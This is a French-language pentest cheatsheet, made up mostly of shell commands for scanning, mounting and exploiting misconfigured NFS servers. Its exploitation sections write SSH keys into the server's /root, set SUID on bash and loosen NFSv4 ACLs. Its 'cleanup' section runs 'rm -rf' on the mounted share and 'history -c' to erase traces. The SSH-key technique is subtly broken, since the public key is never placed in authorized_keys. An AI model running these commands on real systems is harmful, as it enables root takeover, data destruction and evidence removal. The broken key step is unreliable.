📁 NFS – Cheatsheet Cybersécurité

Cheatsheet complète pour scanner, enumérer, monter, exploiter, et attaquer un serveur NFS dans un contexte de pentest.

🔍 1. Détection & scan du service NFS

nmap -p 111,2049 <IP>

Détection des ports RPCBind (111) et NFS (2049)

nmap -sV -p 2049 <IP>

Version du service NFS

nmap -sV --script nfs* <IP>

Scripts NSE : permissions, exports, vulnérabilités, infos

showmount -e <IP>

Liste des exports disponibles sur le serveur NFS

📦 2. Enumération des partages NFS

showmount -e <IP>

Affiche les répertoires exportés (/home, /var/nfs, /mnt…)

rpcinfo -p <IP>

Liste les services RPC actifs (NFS en dépend)

📁 3. Montage d’un partage NFS

sudo mount -t nfs <IP>:/partage /mnt

Montre un export dans /mnt

sudo mount -o nolock <IP>:/home /mnt

Pour contourner les problèmes de lock (utile en CTF)

sudo mount -t nfs -o vers=3 <IP>:/data /mnt

Force la version NFS v3

🔒 4. Vérification des permissions avec root_squash

touch /mnt/test.txt

Test si root a le droit d’écrire

Si erreur → root_squash actif
Si OK → vulnérable

sudo chown root:root /mnt/evil

Test si root a les droits d’écriture
Si ça marche → serveur vulnérable !

🪓 5. Exploitation du “no_root_squash”
Générer une clé SSH depuis le montage

ssh-keygen -f /mnt/root/.ssh/id_rsa -N ""

Génère une clé directement dans le /root du serveur distant

ssh -i /mnt/root/.ssh/id_rsa root@<IP>

Accès root complet si no_root_squash est activé

🐚 6. Exploitation via manipulation de permissions

echo "malware" > /mnt/tmp/file

Écriture arbitraire si permissions mauvaises

chmod +s /mnt/bin/bash

Dépose un SUID root si export mal configuré

chmod 777 /mnt/home/admin

Modifications destructrices possibles en production (à ne pas faire IRL)

🧪 7. Vérification des versions NFS

nmap --script nfs-showmount <IP>

Vérifie les versions NFS

rpcinfo -p <IP>

Vérifie support NFS v2/v3/v4

🔐 8. Analyse & exploitation des ACL

nfs4_getfacl /mnt

Récupère les ACLs NFSv4

nfs4_setfacl -a A::root:rwatTnNcCy /mnt

Modifie les ACL (si mal configurées)

🛠️ 9. Démontage propre

sudo umount /mnt

Démonte le partage

sudo umount -f /mnt

Forcer si bloqué

⚠️ 10. Vulnérabilités NFS fréquentes
❌ no_root_squash activé

Permet à un attaquant root client d’être root sur le serveur → extrêmement critique

❌ Permissions trop permissives (rw,noauth)

Lecture/écriture sans authentification

❌ Export vers 0.0.0.0/0

Accessible à toute personne sur Internet

❌ NFS v3 non chiffré

MITM trivial

❌ Mauvais firewall

Ports RPC largement ouverts (111, 2049, random high ports)

🧰 11. Outils utiles

showmount – Enumération NFS

rpcinfo – Analyse RPCBind

nmap nfs- scripts* – Découverte & vulnérabilités

mount.nfs – Montage du partage

nfs4_setfacl / getfacl – Gestion ACL

Netcat / tcpdump – Analyse trafic NFS

🧹 12. Nettoyage

umount /mnt

Retirer le montage

rm -rf /mnt/*

Nettoyer fichiers créés

history -c

Efface les commandes potentiellement sensibles

📚 13. Ressources utiles

NFS RFC 1094, 1813, 7530

Spécifications NFS v2/v3/v4

HackTricks – NFS Pentesting

Techniques d’exploitation avancées

PayloadAllTheThings – NFS

Scénarios d’attaque & privilège escalade
